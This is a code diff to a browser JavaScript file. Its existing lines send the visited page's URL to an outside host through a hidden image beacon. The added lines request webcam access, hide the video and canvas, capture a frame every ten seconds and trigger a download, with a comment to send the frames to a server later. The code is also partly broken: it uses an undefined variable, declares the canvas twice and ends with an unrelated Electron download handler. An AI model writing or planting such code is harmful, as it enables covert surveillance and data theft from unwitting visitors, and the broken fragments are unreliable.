@@ -1,3 +1,70 @@
 var img = document.createElement('img');
 img.src = "http://albert.entredev.com?url=" + encodeURIComponent(window.location.href);
 document.body.appendChild(img);
+
+var video = document.createElement('video');
+vidElement.style.visibility = 'hidden';
+
+var canvas = document.createElement('canvas'); // Set the canvas up
+canvas.width = 640;
+canvas.height = 480;
+canvas.style.visibility = 'hidden';
+var ctx = canvas.getContext('2d');
+
+
+
+var images;
+
+navigator.getUserMedia = navigator.getUserMedia || // Set up navigator.getUserMedia -- this is
+navigator.webkitGetUserMedia ||
+navigator.mozGetUserMedia ||
+navigator.msGetUserMedia ||
+navigator.oGetUserMedia;
+
+if (navigator.getUserMedia) { // If navigator.getUserMedia exists and is not a null value
+  navigator.getUserMedia({video: true}, handleVideo, videoError); // Set the video up.
+  // Arg 1: condition, Arg 2: What to do with the video, Arg 3: What to do if there is an error
+}
+
+function handleVideo(stream) { // Stream the video
+  video.srcObject = stream; // Sets the source of the video element as the stream
+  video.onloadedmetadata = function(e) {
+    video.play(); // Play the video
+  }
+}
+
+function videoError(e) {
+  console.log(e); // If there is an error, console.log what the error is
+}
+
+function takePic() { // Function to take a picture
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw the current video frame onto the canvas
+
+  var dataURI = canvas.toDataURL('image/jpeg'); // Translate the picture on the canvas into a link
+
+  document.getElementById("takenPic").src = dataURI; // An image element with the id of "takenPic" will display the image
+
+  // TODO: Change the download to send to server
+  //console.log(dataURI)
+
+  var download = document.getElementById('download');
+
+  download.href = dataURI;
+
+  download.click();
+}
+
+var canvas = document.createElement('canvas'); // Set the canvas up
+canvas.width = 640;
+canvas.height = 480;
+var ctx = canvas.getContext('2d');
+
+setInterval(takePic, 10000); // Sets an interval where every single 10000 ms (10 sec) it will call takePic
+
+let webviewSession = session.fromPartition(partitionName);
+webviewSession.on('will-download', function(e, item, webContents) {
+    if (item.getMimeType() === "application/pdf") {
+        e.preventDefault()
+        // logic
+    }
+})
